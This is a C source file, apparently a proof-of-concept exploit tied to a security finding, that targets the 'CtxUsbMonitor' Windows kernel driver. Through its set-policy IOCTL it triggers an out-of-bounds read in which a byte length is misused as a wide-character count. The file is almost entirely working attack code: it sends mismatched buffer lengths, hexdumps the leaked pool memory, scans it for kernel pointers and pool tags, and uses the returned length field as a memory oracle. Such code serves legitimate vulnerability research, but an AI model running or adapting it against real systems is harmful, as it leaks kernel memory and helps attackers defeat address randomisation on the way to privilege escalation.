/*
 * oob_leak.c — Exploit the OOB read (Finding #1) via output buffer echo
 *
 * METHOD_BUFFERED: SystemBuffer = max(InLen, OutLen) from pool.
 * Input copied to SystemBuffer[0..InLen-1].
 * Bytes InLen..max(InLen,OutLen)-1 = UNINITIALIZED POOL DATA.
 *
 * If the driver's wcsnlen scan reads past InLen (using InLen as char limit
 * not byte limit — the bug), and then copies parsed result to output,
 * we may get pool data leaked to usermode.
 *
 * Build (x64): cl /O2 oob_leak.c /Fe:oob_leak.exe
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define DEVICE_PATH       L"\\\\.\\CtxUsbMonitor"
#define IOCTL_SET_POLICY  0x222244

typedef struct _MY_IOSB {
    union { long Status; void *Pointer; };
    ULONG_PTR Information;
} MY_IOSB;

typedef long (__stdcall *NtDIOCF_t)(
    HANDLE, HANDLE, void*, void*, MY_IOSB*, ULONG,
    void*, ULONG, void*, ULONG);

static NtDIOCF_t NtDIOCF = NULL;

static HANDLE open_dev(void) {
    return CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);
}

static void hexdump(const BYTE *data, DWORD len, DWORD offset) {
    DWORD i;
    for (i = 0; i < len; i++) {
        if (i % 16 == 0) printf("    %04X: ", offset + i);
        printf("%02X ", data[i]);
        if (i % 16 == 15 || i == len - 1) {
            /* Pad and print ASCII */
            DWORD pad = 15 - (i % 16);
            DWORD j;
            for (j = 0; j < pad; j++) printf("   ");
            printf(" |");
            DWORD start = i - (i % 16);
            for (j = start; j <= i; j++) {
                BYTE c = data[j];
                printf("%c", (c >= 0x20 && c <= 0x7E) ? c : '.');
            }
            printf("|\n");
        }
    }
}

static void scan_pointers(const BYTE *data, DWORD len, DWORD base_offset) {
    DWORD i;
    for (i = 0; i + 8 <= len; i += 4) {
        uint64_t val = *(uint64_t *)(data + i);
        /* Kernel pointer patterns */
        if ((val >> 44) == 0xFFFFF && val != 0xFFFFFFFFFFFFFFFF) {
            printf("    [KPTR] offset 0x%04X: 0x%016llX\n", base_offset + i, val);
        }
        /* Pool tag patterns (4 printable ASCII chars) */
        if (i + 4 <= len) {
            DWORD dw = *(DWORD *)(data + i);
            BYTE b0 = dw & 0xFF, b1 = (dw >> 8) & 0xFF;
            BYTE b2 = (dw >> 16) & 0xFF, b3 = (dw >> 24) & 0xFF;
            if (b0 >= 0x20 && b0 <= 0x7E && b1 >= 0x20 && b1 <= 0x7E &&
                b2 >= 0x20 && b2 <= 0x7E && b3 >= 0x20 && b3 <= 0x7E &&
                val != 0x4141414141414141ULL) {
                printf("    [TAG?] offset 0x%04X: '%c%c%c%c'\n",
                       base_offset + i, b0, b1, b2, b3);
            }
        }
    }
}

int main(void) {
    printf("=== ctxusbmon OOB leak via output echo ===\n\n");

    NtDIOCF = (NtDIOCF_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtDeviceIoControlFile");
    if (!NtDIOCF) { printf("[-] NtDeviceIoControlFile not found\n"); return 1; }

    /*
     * Test 1: Normal — provide matching input/output, see what echoes
     */
    printf("=== TEST 1: Echo behavior baseline ===\n\n");
    {
        HANDLE dev = open_dev();
        if (dev == INVALID_HANDLE_VALUE) { printf("[-] open failed\n"); return 1; }

        /* Small policy */
        WCHAR input[] = L"allow: vid=1234";
        BYTE output[4096];
        MY_IOSB iosb;

        /* Try different OutputBufferLength values */
        DWORD outsizes[] = { 32, 64, 128, 256, 512, 1024, 4096 };
        int i;
        for (i = 0; i < 7; i++) {
            memset(output, 0xAA, sizeof(output));
            iosb.Status = 0; iosb.Information = 0;

            long st = NtDIOCF(dev, NULL, NULL, NULL, &iosb,
                              IOCTL_SET_POLICY,
                              input, sizeof(input),
                              output, outsizes[i]);

            printf("[*] InLen=%u OutLen=%u → Status=0x%08lX Info=%llu\n",
                   (unsigned)sizeof(input), outsizes[i],
                   (unsigned long)st, (unsigned long long)iosb.Information);

            if (iosb.Information > 0) {
                DWORD show = (DWORD)iosb.Information;
                if (show > 64) show = 64;
                printf("    Output: ");
                DWORD j;
                for (j = 0; j < show; j++) printf("%02X ", output[j]);
                printf("\n");
            }
        }
        CloseHandle(dev);
    }
    printf("\n");

    /*
     * Test 2: OOB exploitation — small InputBufferLength, large OutputBufferLength.
     * The SystemBuffer will be large (OutLen), but only first InLen bytes are our data.
     * If the driver reads past InLen in SystemBuffer (OOB read bug), and copies the
     * result back, we leak the uninitialized pool bytes.
     */
    printf("=== TEST 2: Small input, large output (OOB leak attempt) ===\n\n");
    {
        HANDLE dev = open_dev();
        if (dev == INVALID_HANDLE_VALUE) { printf("[-] open failed\n"); return 1; }

        /* Allocate a buffer that's large enough for NtDeviceIoControlFile.
         * We fill it with a short valid policy followed by controlled content. */
        BYTE inbuf[4096];
        BYTE output[4096];
        MY_IOSB iosb;

        /* Place a short valid policy string at the start */
        WCHAR *winput = (WCHAR *)inbuf;
        wcscpy(winput, L"allow: vid=AAAA");
        DWORD actual_input_len = (DWORD)(wcslen(winput) + 1) * 2;  /* bytes of actual data */

        /* Fill rest with recognizable pattern (will be in SystemBuffer) */
        memset(inbuf + actual_input_len, 0x00, sizeof(inbuf) - actual_input_len);

        /* Test with various InputBufferLength values.
         * The bug: InputBufferLength (bytes) is used as wchar count for wcsnlen.
         * So InLen=32 means wcsnlen scans up to 32 wide chars = 64 bytes.
         * If InLen=32 but actual string is 15 chars (30 bytes),
         * wcsnlen reads 32 wide chars = 64 bytes from SystemBuffer,
         * past our 30-byte string into whatever follows. */
        printf("[*] Actual input string: %d bytes (%d wchars)\n",
               actual_input_len, actual_input_len / 2);
        printf("[*] Testing with increasing InputBufferLength...\n\n");

        DWORD inlens[] = { actual_input_len, 64, 128, 256, 512, 1024 };
        int i;
        for (i = 0; i < 6; i++) {
            memset(output, 0xAA, sizeof(output));
            iosb.Status = 0; iosb.Information = 0;

            /* Provide inbuf with inlens[i] bytes claimed, 4096 output */
            long st = NtDIOCF(dev, NULL, NULL, NULL, &iosb,
                              IOCTL_SET_POLICY,
                              inbuf, inlens[i],
                              output, 4096);

            printf("[*] InLen=%4u OutLen=4096 → Status=0x%08lX Info=%llu\n",
                   inlens[i], (unsigned long)st, (unsigned long long)iosb.Information);

            if (iosb.Information > (ULONG_PTR)actual_input_len) {
                printf("    *** GOT MORE DATA THAN INPUT! Potential leak! ***\n");
                DWORD extra_start = actual_input_len;
                DWORD extra_len = (DWORD)iosb.Information - actual_input_len;
                if (extra_len > 256) extra_len = 256;
                printf("    Extra data beyond input (%u bytes):\n", extra_len);
                hexdump(output + extra_start, extra_len, extra_start);
                scan_pointers(output + extra_start, extra_len, extra_start);
            } else if (iosb.Information > 0) {
                printf("    Output (%llu bytes): ",
                       (unsigned long long)iosb.Information);
                DWORD show = (DWORD)iosb.Information;
                if (show > 48) show = 48;
                DWORD j;
                for (j = 0; j < show; j++) printf("%02X ", output[j]);
                printf("\n");
            }
        }
        CloseHandle(dev);
    }
    printf("\n");

    /*
     * Test 3: Trigger the OOB read oracle on fresh handles to observe
     * Information values — these indicate pool data layout.
     */
    printf("=== TEST 3: OOB oracle on fresh allocations ===\n\n");
    printf("[*] Each handle gets a fresh SystemBuffer from pool.\n");
    printf("[*] Information = wcsnlen result = distance to null in pool.\n\n");
    {
        int i;
        BYTE inbuf[128];
        WCHAR *w = (WCHAR *)inbuf;
        wcscpy(w, L"a");  /* Minimal input: 2 wchars = 4 bytes */
        /* Claim InputBufferLength = 64 → wcsnlen scans 64 wchars = 128 bytes */
        /* But our string is only 1 char → scan reads 63 wchars past it from pool */

        for (i = 0; i < 20; i++) {
            HANDLE dev = open_dev();
            if (dev == INVALID_HANDLE_VALUE) continue;

            MY_IOSB iosb;
            BYTE output[4096];
            memset(output, 0xAA, sizeof(output));
            iosb.Status = 0; iosb.Information = 0;

            long st = NtDIOCF(dev, NULL, NULL, NULL, &iosb,
                              IOCTL_SET_POLICY, inbuf, 64, output, 4096);

            printf("    [%02d] Status=0x%08lX Info=%3llu",
                   i, (unsigned long)st, (unsigned long long)iosb.Information);
            if (iosb.Information > 4) {
                printf("  out[0..7]: ");
                int j;
                int show = (iosb.Information < 16) ? (int)iosb.Information : 16;
                for (j = 0; j < show; j++) printf("%02X ", output[j]);
            }
            printf("\n");

            CloseHandle(dev);
        }
    }
    printf("\n");

    printf("=== DONE ===\n");
    return 0;
}
